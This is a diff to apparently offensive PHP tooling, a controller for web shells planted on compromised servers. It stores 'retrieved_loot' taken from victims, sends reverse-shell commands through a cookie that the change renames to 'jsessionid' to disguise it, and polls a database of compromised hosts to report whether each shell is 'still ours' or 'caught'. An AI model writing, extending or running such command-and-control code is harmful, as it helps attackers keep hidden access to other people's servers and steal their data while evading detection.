@@ -177,7 +177,7 @@ function b64(array $what, $how, array $whereWeGo)
                 logo('co', clears, false, '', '');
                 //TODO need to fix this, and why its dumping the ENTIRE response object over the base64 encoded value. once this is done, will add a routine to plop it right into the db
                 //depending on size, placing larger files on disk rather than db.
-                file_put_contents("includes/db/retrieved_loot/".curl_getinfo(CHH, CURLINFO_PRIMARY_IP), $dx, FILE_APPEND);
+                file_put_contents("includes/db/retrieved_loot/".curl_getinfo(CHH, CURLINFO_FILETIME), $dx, FILE_APPEND);
                 echo $dx."\n";
                 break;
             default:
@@ -425,7 +425,7 @@ function rev($host, $port, $method)
         curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
         curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
         curl_setopt(CHH, CURLOPT_POST, true);
-        curl_setopt(CHH, CURLOPT_COOKIE, "r={$revCommand}");
+        curl_setopt(CHH, CURLOPT_COOKIE, "jsessionid={$revCommand}");
         curl_setopt(CHH, CURLOPT_POSTFIELDS, "");
         $syst = curl_exec(CHH);
         if (!curl_errno(CHH)) {
@@ -641,7 +641,7 @@ function check($host, $path, $batch)
 {
     $curlHandle = CHH;
     if ($batch === "y") {
-        $c = pg_exec(pg_connect(DBCONN), "SELECT rhost,uri FROM sloppy_bots_main WHERE rhost IS NOT NULL");
+        $c = pg_exec(pg_connect(DBCONN), "SELECT check_in,rhost,uri FROM sloppy_bots_main WHERE rhost IS NOT NULL");
         $count = pg_exec(pg_connect(DBCONN), 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
         $rows = pg_fetch_all($c);
         echo "Pulling: " . pg_fetch_result($count, null, null) . "\nThis could take awhile.";
@@ -655,15 +655,19 @@ function check($host, $path, $batch)
             switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                 case 200:
                     echo "{$r['rhost']}{$r['uri']} is still ours!\n";
+                    pg_exec(pg_connect(DBCONN), sprintf("UPDATE sloppy_bots_main SET check_in = '%s' WHERE rhost = '%s'",  (int)$r['check_in'] + 1,$r['rhost']));
                     break;
                 case 404:
                     echo "{$r['rhost']}{$r['uri']}\nLooks like our shell was caught... sorry..\n";
+                    echo "Returned Status: ".curl_getinfo(CHH, CURLINFO_HTTP_CODE)."\n";
                     break;
                 case 500:
                     echo "{$r['rhost']}{$r['uri']}\nYour useragent was not the correct one... did you forget??\n";
+                    echo "Returned Status: ".curl_getinfo(CHH, CURLINFO_HTTP_CODE)."\n";
                     break;
                 default:
                     echo "Hmm. A status other than what i was looking for was returned on {$r['rhost']}{$r['uri']}, please manually confirm the shell was uploaded.\n";
+                    echo "Returned Status: ".curl_getinfo(CHH, CURLINFO_HTTP_CODE)."\n";
                     break;
             }
         }
